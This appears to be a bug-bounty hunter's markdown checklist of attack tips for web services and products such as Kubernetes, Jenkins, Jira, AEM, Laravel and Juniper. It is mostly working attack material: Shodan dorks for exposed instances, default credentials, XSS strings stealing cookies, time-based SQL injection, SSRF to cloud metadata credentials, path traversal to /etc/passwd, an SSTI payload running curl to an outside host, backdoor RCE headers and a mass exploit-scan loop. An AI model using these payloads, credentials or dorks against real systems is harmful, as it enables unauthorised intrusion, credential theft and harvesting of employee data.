# Services Checklist

<details>
<summary>Unauthenticated Instances issues</summary>

<dl>
<dd>

<details>
<summary>**Unauthenticated Kubernetes API**</summary>

<dl>
<dd>

```
Kubernetes exposes an unauthenticated REST API on port 10250

Once again we have 2 options, nMap for this port or shodan

product:"kubernetes"
port:"10250"

Once a Kubernetes service is detected the first thing to do is to get a list of pods by sending a GET request to the /pods endpoint.


apt-get install node-ws
wscat -c “https://<DOMAIN>:<PORT>/<Location Header Value>” –no-check

Its very easy to get RCE from this method :)
```

</dd>
</dl>

</details>

<details>
<summary>**Unauthenticated odoo Manager**</summary>

<dl>
<dd>

```
Shodan Dork

http.status:200 http.component:odoo port:8069

After finding instances go to /web/database/manager most of the time there is either no password or it's "admin"

Or simply port scan for 8069
```

</dd>
</dl>

</details>

<details>
<summary>**Unauthenticated Jenkins Instance**</summary>

<dl>
<dd>

```
Sometimes an application will be running Jenkins which allows Guest/Anonymous signups with /script enabled which allows code exec

Also if you can install plugins there is a terminal plugin

Try dirsearch for /script or use this script to find live Jenkins instances.

Also worth checking Port 8080 alongside 443,80


I recommened if you are working on a big program with thousands of domains to grep for jenkins and pipe all subdomains into full tcp ports scans. Sometimes the instance can be running on a weird port :)


Also grep for these headers

X-Hudson: 1.395
X-Jenkins: 2.204.2
X-Jenkins-Session: d615ef86
X-You-Are-Authenticated-As: anonymous
X-You-Are-In-Group-Disabled: JENKINS-39402:


Shodan Dork to Find Open Jenkins Instances

x-jenkins 200
```

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Nginx Path Traversal</summary>

<dl>
<dd>

https://twitter.com/403Timeout/status/1479445235424194560?s=20&t=DTRsTBz4tWFuwxorT_khoQ

</dd>
</dl>

</details>

<details>
<summary>Drupal stuff</summary>

<dl>
<dd>

1. https://twitter.com/steiner254/status/1521133687240372224?s=20&t=Dg3EzxfBEFlPeh5ba_-ZZQ

2. https://twitter.com/Steiner254/status/1563961901284999179?s=20

</dd>
</dl>

</details>

<details>
<summary>****Java Deserialization RCE****</summary>

<dl>
<dd>

<details>
<summary>https://github.com/joaomatosf/jexboss</summary>



</details>

$ for url in $(cat targets.txt); do python3 jexboss.py -u $url; print $url; done

</dd>
</dl>

</details>

<details>
<summary>Oracle E-Business Login mass scan —-</summary>

<dl>
<dd>

<details>
<summary>https://github.com/momika233/Oracle-E-Business_Login</summary>

<dl>
<dd>

Shodan:“X-ORACLE-DMS-ECID” http. title:”Login” 200

</dd>
</dl>

</details>

<details>
<summary>Another way</summary>

<dl>
<dd>

cat subdomains.txt | httpx -mc 200 -path 'OA\_HTML/ibeCAcpSSOReg.jsp' -ms ">Register as individual</a>" -t 200 - rl 100 -o oracle.txt

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Jira vulnerabilities</summary>

<dl>
<dd>

<details>
<summary>SSRF on Jira endpoint</summary>

<dl>
<dd>

1. /plugins/servlet/oauth/users/icon-uri?consumerUri=http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/

2. /plugins/servlet/gadgets/makeRequest?url=http://host:port@bing.com

</dd>
</dl>

</details>

<details>
<summary>XSS on Jira endpoint</summary>

<dl>
<dd>

1. /plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)

2. secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search

3. pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E.vm

4. http://jira.test.com/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.cookie

</dd>
</dl>

</details>

<details>
<summary>RCE & Path Traversal</summary>

<dl>
<dd>

POST /rest/tinymce/1/macro/preview HTTP/1.1  
Host: JIRA  
...

{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler(.)com/v/23464dc5","width":"1000","height":"1000","\_template":"file:///etc/passwd"},"body":""}}

</dd>
</dl>

</details>

<details>
<summary>User info disclosure on Jira endpoint</summary>

<dl>
<dd>

1. /rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true

2. /s/thiscanbeanythingyouwant/\_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml

3. rest/api/2/user/picker?query=admin

</dd>
</dl>

</details>

<details>
<summary>SSTI</summary>

<dl>
<dd>

/secure/ContactAdministrators!default.jspa  
Try SSTI payload in subject and/or body:  
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://xyz.burp(.)net').waitFor()

</dd>
</dl>

</details>

<details>
<summary>CVE-2020-14179(Info disclosure):</summary>

<dl>
<dd>

http://<JIRA>/secure/QueryComponent!Default.jspa

</dd>
</dl>

</details>

<details>
<summary>CVE-2020-14178(Project Key Enum):</summary>

<dl>
<dd>

http://<JIRA>/browse.<PROJECTKEY>

</dd>
</dl>

</details>

<details>
<summary>CVE-2020-14181(User enum):</summary>

<dl>
<dd>

http://<JIRA>/secure/ViewUserHover.jspa?username=Admin

</dd>
</dl>

</details>

<details>
<summary>CVE-2020-36289(Username Enumeration) :</summary>

<dl>
<dd>

https://<JIRA>/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin

</dd>
</dl>

</details>

<details>
<summary>Jira-unauth-popular-filters:</summary>

<dl>
<dd>

https://<JIRA>/secure/ManageFilters.jspa?filterView=popular

/ConfigurePortalPages!default.jspa?view=popular

</dd>
</dl>

</details>

<details>
<summary>Jira-unauthenticated-dashboards:</summary>

<dl>
<dd>

https://<JIRA>/rest/api/2/dashboard?maxResults=100

</dd>
</dl>

</details>

<details>
<summary>Getting employees email</summary>

<dl>
<dd>

If you want to get a list of all employees (emails, names) that belongs to your target company!  
Try to find Jira Servicedesk, sometimes there is a misconfiguration that allows you to signup using your personal email! and get access to internal dashboards

Assume that you target company is REDACTED, go to

https://redacted.atlassian.net/servicedesk/

and sometimes you'll find the signup button available.  
Create your account and then access it using your pass

Go to some portals inside the dashboard and try to find where you can search for internal employees (see the picture below where i was able to select the manager name, email by just changing the first letter in the search box)

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Atlassian.net targets endpoint to check</summary>

<dl>
<dd>

1. For target.atlassian(.)net, check this endpoints:  
   /servicedesk/customer/user/signup [Able to login? Vuln:)]  
   /jira/projects [Can see projects? Vuln:) Now click on sign in and use OAuth]

</dd>
</dl>

</details>

<details>
<summary>Hidden signup endpoints of different services</summary>

<dl>
<dd>

1. laravel : /register

2. drupal: /user/register

3. wordpress: /wp-login.php?action=register

4. ezpublish: /register

</dd>
</dl>

</details>

<details>
<summary>Spring boot actuator</summary>

<dl>
<dd>

"application/vnd.spring-boot.actuator.v3+json"  
  
end points :  
actuator/beans  
actuator/info  
actuator/caches  
actuator/env

</dd>
</dl>

</details>

<details>
<summary>Spring boot apps</summary>

<dl>
<dd>

If you see this error :

https://pbs.twimg.com/media/GJGBQrVXUAA8syi?format=png&name=900x900

Then try :

1. actuator/logfile

2. And do try this steps : https://www.veracode.com/blog/research/exploiting-spring-boot-actuators

Reference : https://twitter.com/bogdantcaciuc7/status/1770338438648094895

</dd>
</dl>

</details>

<details>
<summary>ASP.NET server web-apps tip</summary>

<dl>
<dd>

<details>
<summary>Tip1</summary>

<dl>
<dd>

whenever you see : )  
Server: Microsoft-IIS/6.X  
X-Powered-By: ASP.NET

Always try this .....   
/admin/help.cgi  
/admin/help.cgi.bak  
/admin/WS\_FTP.LOG  
/adovbs.inc  
/confirm.asp.bak   
/default.asp.bak  
/login.asp.bak

/pindex.asp.bak  
/rootlogin.asp.bak  
/rootlogin.asp.old  
/\_vti\_pvt/service.cnf  
/include/common.inc  
/WS\_FTP.LOG

<details>
<summary>Outcomes</summary>

<dl>
<dd>

1. A serious WS\_FTP vulnerability was identified within your web application. WS\_FTP is a popular FTP client for Windows which is utilized by system administrators and developers to upload and download files from web servers, with each transfer notated in a log file by default.

2. The service.cnf file was found in the \_vti\_pvt directory on a system running Microsoft FrontPage Server Extensions. An attacker could submit a request for the vulnerable file and cause the server to reveal sensitive system information.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

Tricky ASP blind SQL Injection in a login page in `logon` param. Confirmed using Blind-boolean method,but it took me hours before I found the right payload - that need to be encoded. Sadly, not triaged yet

Payload: `';%20waitfor%20delay%20'0:0:6'%20--%20`

</dd>
</dl>

</details>

<details>
<summary>Tip 3</summary>

<dl>
<dd>

1. Found subdomain(404 asp[.]net) via recon and start fuzzing dir (aspx&asp) extention.  
2. Discovered reset.aspx page (have input username) & paste payload (';waitfor delay '0:0:10'--) and delay worked ;D

</dd>
</dl>

</details>

<details>
<summary>Tip 4</summary>

<dl>
<dd>

1. Dnsbrute and grep some subdomains

2. Start directory fuzzing with .aspx extention

3. Discovered Passwordresx.aspx and paste payload (' waitfor delay'0:0:20'--)

</dd>
</dl>

</details>

<details>
<summary>Tip 5</summary>

<dl>
<dd>

Always check `viewstate` In Asp. Net

- https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Firebase Databases misconfig</summary>

<dl>
<dd>

- https://ghostlulz.com/google-exposed-firebase-database/

- https://twitter.com/_justYnot/status/1438355065518002180?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

</dd>
</dl>

</details>

<details>
<summary>Php myadmin</summary>

<dl>
<dd>

1. https://twitter.com/tamimhasan404/status/1522814723271512065?s=20&t=gncOEVMInXljTB0nVKjFQA

2. https://twitter.com/therceman/status/1551620350999494657?s=20&t=oky5cuE9-2Q2tjsMh0eTcQ

3. https://twitter.com/cycatz2/status/1476518831702953985?s=20&t=oky5cuE9-2Q2tjsMh0eTcQ

4. https://twitter.com/naglinagli/status/1374332024920608774?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

5. /phpmyadmin/scripts/setup.php

6. setup/index.php?page=servers&mode=test&id=test

</dd>
</dl>

</details>

<details>
<summary>OKTA</summary>

<dl>
<dd>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

Whenever you end up on Okta login, click on "Need help signing in" just to see if there is any link to their internal wiki or helpdesk. I ended up on an IT helpdesk which had "Sign Up" enabled and got access to internal docs, passwords & what not

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Apache Tomcat</summary>

<dl>
<dd>

1. /webapp/admin/login.html?1%001337'%3balert('akr3ch')%2f%2f

2. They are vulnerable to xss target/examples/jsp/cal/cal2.jsp?time=8am%20STYLE=xss:e/\*\*/xpression(try{a=firstTime}catch(e){firstTime=1;alert('XSS')});

3. 1. fuzz website  
   2- found this path /jk\_status?cmd=dump = dump data  
   3- search more about this misconfigure  
   4- found /jk\_status?opt=0 = read and write privilege

4. CVE-2019-10092 Apache HTTP Server <=2.4.39 - HTML Injection/Partial Cross-Site Scripting

Payload: https://target[.]com/%5cevil[.]com/evil.html

</dd>
</dl>

</details>

<details>
<summary>Matomo</summary>

<dl>
<dd>

/matomo/.travis.yml

</dd>
</dl>

</details>

<details>
<summary>Wordpress</summary>

<dl>
<dd>

Tip: Always check for Directory Listing on wordpress wp-content/uploads/ folder, 90% it contains sensitive information.

2. Check for ?action=register in wp-admin

</dd>
</dl>

</details>

<details>
<summary>Laravel Framework</summary>

<dl>
<dd>

1. LFI : //////////////////../../../../../../../../etc/passwd

2. If you encounter in a Website running on Laravel don't forget to check /\_debugbar which is Debug Mode Enabled for Laravel and you might end up finding Sensitive Data Like DB Creds and other stuff.

3. While testing a Laravel site try injecting different kinds of payloads or change Request methods to GET>POST or POST>GET. this will result in Laravel exception handler error Disclosing AWS, Database, and SMTP Credentials.

</dd>
</dl>

</details>

<details>
<summary>Symfony</summary>

<dl>
<dd>

1. If you find Web frameworks: Symfony in wappalayzer  
   once try subdomain[.]target[.]com/app\_dev.php/\_profiler/open?file=app/config/parameters.yml >> Leaks database Credentials and some Sensitive Data.

2. If you happen to find Symfony Web Framework that has Symfony profiler debug mode enabled, fuzz the following endpoints:
   - /app\_dev.php
   - /app\_dev.php/\_profiler/phpinfo
   - /app\_dev.php/\_profiler
   - Look for "profiler token" in phpinfo()

3. Also, always check Symfony targets for these directories: /\_profiler.  
   You might find phpinfo containing Symfony secrets, which can lead to RCE.

</dd>
</dl>

</details>

<details>
<summary>AEM</summary>

<dl>
<dd>

<details>
<summary>Tip 1 :</summary>

<dl>
<dd>

AEM default credentials allows me to get admin access to AEM login with all functions allowed and all PII for users on AEM  
  
1. Navigate to

http://dev.x.y.com/libs/granite/core/content/login.html…

2.Login using the below credentials  
  
Username: admin , password: author or  
  
Username: author , password: author  
  
3. Now I logged In to panel and have the admin permission so I able to add, delete, modify anything on the AEM panel

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

[+] Another awesome Adobe AEM Dispatcher filter bypass technique? oh okay  
  
Hunting for JSON GET Servlet on /content.1.json however result = 404?  
  
Try this:  
  
/conten/.1.json   
/conten/t.1.json  
/content.tidy.1.json  
/conten/.tidy.infinity.json

/conten.json

<details>
<summary>XSS & HTMLi</summary>

<dl>
<dd>

I've had HTML injection using the childrenlist selector, e.g:  
/content/<h1>test</h1>.childrenlist.json  
and with html as ext:  
content/<h1>test</h1>.childrenlist.html

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Tip 3</summary>

<dl>
<dd>

If your application uses Adobe Experience Manager, then use the dorks to find PII disclosure.

Don't forget the dork:-  
inurl:/content/dam/ ext:xls

</dd>
</dl>

</details>

<details>
<summary>tip 4</summary>

<dl>
<dd>

https://evil[.]com/IM49%3Cimg%20src=x%20data%27a%27onerror=alert%28domain%29%3E.childrenlist.html

</dd>
</dl>

</details>

<details>
<summary>tip 5</summary>

<dl>
<dd>

target[.]com/etc/groovyconsole.html  
and use the payload in the pic

If you lucky enough you can have nice RCE ;)

![](Untitled.png)

</dd>
</dl>

</details>

<details>
<summary>tip 6</summary>

<dl>
<dd>

you can go to   
target[.]com/libs/granite/core/content/login.html  
in try one of this AEM default credentials

https://open-sez.me/passwd-adobe.htm…

![](Untitled%201.png)

in my case it was anonymous:anonymous

</dd>
</dl>

</details>

<details>
<summary>Cache Poisoning</summary>

<dl>
<dd>

![](Untitled%202.png)

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Zendesk</summary>

<dl>
<dd>

<details>
<summary>Wordlist to fuzz</summary>

<dl>
<dd>

https://t.co/mUsjFRX8Xu

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Cloudfusion</summary>

<dl>
<dd>

<details>
<summary>XSS</summary>

<dl>
<dd>

{{host}}/CFIDE/debug/cf\_debugFr.cfm?userPage=javascript:alert(document.domain)

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>IIS</summary>

<dl>
<dd>

https://x.com/ctbbpodcast/status/1688607912434819073?s=20

https://x.com/TodayCyberNews/status/1699142226960654409?s=20

<details>
<summary>Tip</summary>

<dl>
<dd>

If you encounter the default IIS Windows window, do not forget to add /haproxy and /netdata to your wordlist and scan them, if you gain unauthorized access here, you will earn a reward

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>JFrog</summary>

<dl>
<dd>

1. Sometimes jfrog instances are unprotected you can try on your targets like http://target.jfrog.io

2. you found Jfrog URL  
   and you get 403 / 401 ?  
   try to add `/ui/repos/tree/General` maybe you get lucky and found nuget / other compile customer source code :)

</dd>
</dl>

</details>

<details>
<summary>Swagger</summary>

<dl>
<dd>

<details>
<summary>Tip `XSS`</summary>

<dl>
<dd>

Whenever I see a Swagger UI, I check its version. And, I try out these payloads:  
  
?configUrl=https://jumpy-floor.surge.sh/test.json

?url=https://jumpy-floor.surge.sh/test.yaml

?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>PHP 8.1.0-dev</summary>

<dl>
<dd>

If you find PHP 8.1.0-dev then try RCE & SQLi  
User-Agentt: zerodiumsleep(5);  
User-Agentt: zerodiumsystem('id');

</dd>
</dl>

</details>

<details>
<summary>Oracle E-Business</summary>

<dl>
<dd>

<details>
<summary>Registeration endpoint</summary>

<dl>
<dd>

/OA\_HTML/ibeCAcpSSOReg.jsp

/OA\_HTML/ibeCRgpIndividualUser.jsp

/OA\_HTML/ibeCRgpPrimaryCreate.jsp

/OA\_HTML/ibeCRgpPartnerPriCreate.jsp

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>cake-php 2.2</summary>

<dl>
<dd>

https://cakephp[.]com/pages/account/%22%3E%3Cimage%20src=x%20onerror=alert(0)%3E

</dd>
</dl>

</details>

<details>
<summary>Apolo server</summary>

<dl>
<dd>

if you found apollo-server exposed on /api/graphql , you can manipulate the embedded page via endpoint URL parm , and inject your own host to receive the graphql query (steal users' information ..etc )

</dd>
</dl>

</details>

<details>
<summary>Juniper</summary>

<dl>
<dd>

Juniper Web Device Manager RCE

POST /?PHPRC=/dev/fd/0 HTTP/1.1  
Host: {{Hostname}}

auto\_prepend\_file="/etc/passwd"

</dd>
</dl>

</details>

<details>
<summary>jolokia</summary>

<dl>
<dd>

1. If you found /actuator/jolokia/ endpoint in your target you can escalate it to LFI POC:https://target[.]com/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd

2. XSS /jolokia/read<svg onload=alert(document.cookie)>?

</dd>
</dl>

</details>

<details>
<summary>camunda</summary>

<dl>
<dd>

/camunda/app/welcome/default/#!/login

default pass : demo:demo

</dd>
</dl>

</details>

<details>
<summary>Servicenow</summary>

<dl>
<dd>

1. RXSS & open redirect : https://domain.com/auth\_redirect.do?sysparm\_stack=no&sysparm\_url=javascript:alert(document.cookie))

</dd>
</dl>

</details>
